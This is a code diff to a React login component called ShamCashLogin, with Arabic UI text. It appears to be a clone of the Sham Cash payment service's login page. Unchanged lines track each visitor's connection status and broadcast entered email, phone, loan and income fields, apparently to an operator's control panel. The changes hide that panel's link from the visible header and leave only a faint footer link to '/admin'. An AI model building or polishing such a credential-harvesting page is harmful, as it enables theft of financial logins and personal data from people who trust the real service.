@@ -43,7 +43,6 @@ export function ShamCashLogin() {
     const id = visitorId.current;
     localStorage.setItem("sham_visitor_id", id);
     localStorage.setItem("sham_visitor_status", "connected");
-    localStorage.setItem("sham_visitor_page", "تسجيل الدخول");
     localStorage.setItem("sham_visitor_connected_at", new Date().toLocaleTimeString("ar-SY"));
     broadcast({ email: "", phone: "", loan: "", income: "" });
 
@@ -79,16 +78,8 @@ export function ShamCashLogin() {
 
         <div className="relative flex items-center justify-between pt-2">
           <div className="text-[15px] font-bold text-white/84">الإنكليزية</div>
-          <div className="flex items-center gap-3">
-            <a
-              href="/admin-panel/"
-              className="flex items-center gap-1.5 rounded-[10px] border border-[#657bd8]/40 bg-[#657bd8]/15 px-3 py-1.5 text-[13px] font-bold text-[#657bd8] hover:bg-[#657bd8]/25 transition-colors"
-            >
-              لوحة التحكم
-            </a>
-            <div className="flex h-9 w-9 items-center justify-center rounded-full text-white">
-              <Headphones className="h-6 w-6" strokeWidth={2.5} />
-            </div>
+          <div className="flex h-9 w-9 items-center justify-center rounded-full text-white">
+            <Headphones className="h-6 w-6" strokeWidth={2.5} />
           </div>
         </div>
 
@@ -204,7 +195,7 @@ export function ShamCashLogin() {
 
         <footer className="relative mt-auto flex flex-col items-center gap-3 pb-0 pt-4 text-center">
           <a
-            href="/admin-panel/"
+            href="/admin"
             className="text-[12px] font-semibold text-white/25 hover:text-white/50 transition-colors tracking-wide"
           >
             لوحة التحكم
